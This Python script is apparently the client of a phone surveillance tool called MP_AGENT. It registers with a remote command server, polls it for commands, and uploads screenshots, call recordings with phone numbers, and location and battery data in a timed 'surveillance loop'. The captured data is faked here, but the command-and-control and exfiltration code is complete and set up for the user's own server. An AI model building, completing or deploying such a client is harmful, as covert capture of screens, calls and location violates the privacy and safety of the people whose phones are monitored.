import requests
import time
import random
import platform
from datetime import datetime
import json

class RealAndroidAgent:
    def __init__(self, agent_id, platform_url):
        self.agent_id = agent_id
        self.platform_url = platform_url
        self.running = True
        self.screenshot_count = 0
        self.call_count = 0
        
    def get_device_info(self):
        """Generate realistic device information"""
        phone_models = [
            "Samsung Galaxy S23", "Google Pixel 7", "OnePlus 11", 
            "Xiaomi 13", "iPhone 14 Pro", "Huawei P60",
            "Samsung Galaxy A54", "Google Pixel 6a", "OnePlus Nord 3"
        ]
        
        android_versions = [
            "Android 13", "Android 14", "Android 12",
            "Android 11", "Android 10"
        ]
        
        return {
            'agent_id': self.agent_id,
            'phone_model': random.choice(phone_models),
            'android_version': random.choice(android_versions),
            'timestamp': datetime.now().isoformat(),
            'battery_level': random.randint(20, 100),
            'location': f"{random.uniform(-90, 90):.6f}, {random.uniform(-180, 180):.6f}"
        }
    
    def register_with_platform(self):
        """Register this agent with the MP_AGENT platform"""
        try:
            device_info = self.get_device_info()
            print(f"📱 Attempting to register agent: {self.agent_id}")
            print(f"🌐 Platform URL: {self.platform_url}")
            
            response = requests.post(
                f"{self.platform_url}/api/agent/register",
                json=device_info,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            print(f"📡 Registration response: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                print(f"✅ Successfully registered: {data}")
                
                # Check for pending commands
                if data.get('pending_commands'):
                    print(f"📡 Found {len(data['pending_commands'])} pending commands")
                    for cmd in data['pending_commands']:
                        print(f"🎯 Executing command: {cmd}")
                        self.execute_command(cmd)
                return True
            else:
                print(f"❌ Registration failed: {response.status_code} - {response.text}")
                return False
                
        except Exception as e:
            print(f"💥 Registration error: {str(e)}")
            return False
    
    def execute_command(self, command):
        """Execute commands from the platform"""
        try:
            if command == 'capture_screenshot':
                print("📸 Executing: capture_screenshot")
                self.upload_screenshot()
            elif command == 'get_device_info':
                print("📱 Executing: get_device_info")
                self.register_with_platform()
            elif command == 'get_location':
                print("📍 Executing: get_location")
                self.update_status()
            elif command == 'record_audio':
                print("🎤 Executing: record_audio")
                self.upload_call_recording()
            else:
                print(f"🤖 Unknown command: {command}")
                
        except Exception as e:
            print(f"💥 Command execution failed: {e}")
    
    def generate_fake_screenshot(self):
        """Generate a fake screenshot (in real scenario, this would capture real screen)"""
        # Create a simple "screenshot" image data
        screenshot_data = f"FAKE_SCREENSHOT_{self.agent_id}_{int(time.time())}".encode()
        return screenshot_data
    
    def upload_screenshot(self):
        """Upload screenshot to platform"""
        try:
            print("📸 Capturing screenshot...")
            screenshot_data = self.generate_fake_screenshot()
            
            files = {'screenshot': ('screen.jpg', screenshot_data, 'image/jpeg')}
            data = {'agent_id': self.agent_id}
            
            response = requests.post(
                f"{self.platform_url}/api/agent/upload_screenshot",
                files=files,
                data=data,
                timeout=30
            )
            
            if response.status_code == 200:
                self.screenshot_count += 1
                print(f"✅ Screenshot #{self.screenshot_count} uploaded successfully")
                return True
            else:
                print(f"❌ Screenshot upload failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"💥 Screenshot upload error: {e}")
            return False
    
    def generate_fake_call_recording(self):
        """Generate fake call recording data"""
        call_data = f"FAKE_CALL_RECORDING_{self.agent_id}_{int(time.time())}".encode()
        return call_data
    
    def upload_call_recording(self):
        """Upload call recording to platform"""
        try:
            print("📞 Recording call...")
            call_data = self.generate_fake_call_recording()
            call_types = ['incoming', 'outgoing', 'missed']
            
            files = {'audio': ('call_recording.mp3', call_data, 'audio/mpeg')}
            data = {
                'agent_id': self.agent_id,
                'call_type': random.choice(call_types),
                'phone_number': f"+1{random.randint(200, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}",
                'duration': random.randint(10, 300)
            }
            
            response = requests.post(
                f"{self.platform_url}/api/agent/upload_call",
                files=files,
                data=data,
                timeout=30
            )
            
            if response.status_code == 200:
                self.call_count += 1
                print(f"✅ Call recording #{self.call_count} uploaded successfully")
                return True
            else:
                print(f"❌ Call upload failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"💥 Call upload error: {e}")
            return False
    
    def update_status(self):
        """Update agent status with battery and location"""
        try:
            status_data = {
                'agent_id': self.agent_id,
                'battery_level': random.randint(15, 95),
                'location': f"{random.uniform(-90, 90):.6f}, {random.uniform(-180, 180):.6f}"
            }
            
            response = requests.post(
                f"{self.platform_url}/api/agent/update_status",
                json=status_data,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            if response.status_code == 200:
                print("🔋 Status updated successfully")
                return True
            else:
                print(f"❌ Status update failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"💥 Status update error: {e}")
            return False
    
    def check_commands(self):
        """Check for pending commands from platform"""
        try:
            print("🔍 Checking for commands...")
            response = requests.get(
                f"{self.platform_url}/api/agent/check_commands/{self.agent_id}",
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                commands = data.get('commands', [])
                
                if commands:
                    print(f"📡 Found {len(commands)} pending commands")
                    
                for cmd in commands:
                    print(f"🎯 Executing command: {cmd['command']} (ID: {cmd['id']})")
                    self.execute_command(cmd['command'])
                    
                    # Mark command as completed
                    result_data = {
                        'command_id': cmd['id'],
                        'result': f'Command {cmd["command"]} executed successfully at {datetime.now().isoformat()}'
                    }
                    
                    requests.post(
                        f"{self.platform_url}/api/agent/command_result",
                        json=result_data,
                        headers={'Content-Type': 'application/json'},
                        timeout=10
                    )
                    print(f"✅ Command {cmd['id']} marked as completed")
                    
                return len(commands)
            else:
                print(f"❌ Command check failed: {response.status_code}")
                return 0
                
        except Exception as e:
            print(f"💥 Command check error: {e}")
            return 0
    
    def start_surveillance(self):
        """Start the main surveillance loop"""
        print("🎯 MP_AGENT Surveillance Starting...")
        print(f"🆔 Agent ID: {self.agent_id}")
        print(f"🌐 Platform: {self.platform_url}")
        print("=" * 50)
        
        # Initial registration
        if not self.register_with_platform():
            print("❌ Initial registration failed. Retrying in 30 seconds...")
            time.sleep(30)
            if not self.register_with_platform():
                print("💥 Failed to register with platform. Exiting.")
                return
        
        surveillance_cycle = 0
        
        while self.running:
            try:
                surveillance_cycle += 1
                print(f"\n🔄 Surveillance Cycle #{surveillance_cycle}")
                print("-" * 40)
                
                # Check for commands every cycle
                self.check_commands()
                
                # Upload screenshot every 3 cycles
                if surveillance_cycle % 3 == 0:
                    self.upload_screenshot()
                
                # Upload call recording every 5 cycles  
                if surveillance_cycle % 5 == 0:
                    self.upload_call_recording()
                
                # Update status every 2 cycles
                if surveillance_cycle % 2 == 0:
                    self.update_status()
                
                # Re-register every 10 cycles (heartbeat)
                if surveillance_cycle % 10 == 0:
                    self.register_with_platform()
                
                print(f"✅ Cycle #{surveillance_cycle} completed")
                print(f"⏰ Next cycle in 30 seconds...")
                time.sleep(30)
                
            except KeyboardInterrupt:
                print("\n🛑 Surveillance interrupted by user")
                self.stop_surveillance()
                break
            except Exception as e:
                print(f"💥 Surveillance error: {e}")
                print("🔄 Retrying in 60 seconds...")
                time.sleep(60)
    
    def stop_surveillance(self):
        """Stop the surveillance"""
        self.running = False
        print("🛑 Surveillance stopped")

def main():
    """Main function to run the agent"""
    
    # Configuration - UPDATE THESE FOR YOUR SETUP
    PLATFORM_URL = "https://mp-agent.onrender.com/"  # Your platform URL
    AGENT_ID = "phone1"  # Change this for different agents
    
    print("🤖 MP_AGENT - Real Android Surveillance Agent")
    print("=============================================")
    
    # Create and start agent
    agent = RealAndroidAgent(AGENT_ID, PLATFORM_URL)
    
    try:
        agent.start_surveillance()
    except KeyboardInterrupt:
        print("\n👋 Agent shutdown complete")
    except Exception as e:
        print(f"💥 Fatal error: {e}")

if __name__ == "__main__":
    main()